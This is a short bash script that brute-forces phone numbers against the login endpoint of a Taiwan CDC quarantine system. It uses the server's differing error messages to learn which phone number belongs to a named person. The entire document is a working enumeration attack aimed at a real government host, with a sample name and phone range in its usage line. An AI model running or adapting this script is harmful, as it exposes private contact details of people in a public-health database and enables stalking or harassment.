#!/bin/bash

if [ $# -lt 3 ]; then
	echo "usage: $0 [name] [start_phone] [end_phone]"
	echo "   eg: $0 王大明 0913100000 0913100005"
	exit -1
fi

COOKIE_FILE=$(mktemp ./cookie.XXXXXX)

curl -s -q -b $COOKIE_FILE -c $COOKIE_FILE 'http://sqms.cdc.gov.tw:8080/Login/ESRLogin' > /dev/null
curl -s -q -b $COOKIE_FILE 'http://sqms.cdc.gov.tw:8080/Login/ReValidateCode'  > /dev/null

NAME=$1
START_PHONE=`expr $2 + 0`
END_PHONE=`expr $3 + 0`

for i in $(eval echo "{$START_PHONE..$END_PHONE}")
do
	PHONE=`printf '%010d' $i`

	# slow down the script kid
	sleep 1

	echo "testing:" $PHONE
	RST=`curl -s -q -b $COOKIE_FILE  \
		'http://sqms.cdc.gov.tw:8080/Login/ESRLoginChk' \
		--data-urlencode "Name=$NAME" \
		--data-raw "Phone=$PHONE&VerificationCode=" `
	# echo $RST
	if [ "$RST" = '驗證碼錯誤' ]; then
		echo "$NAME: " $PHONE
		rm $COOKIE_FILE
		exit 0
	fi
done
echo "$NAME: not found"
rm $COOKIE_FILE
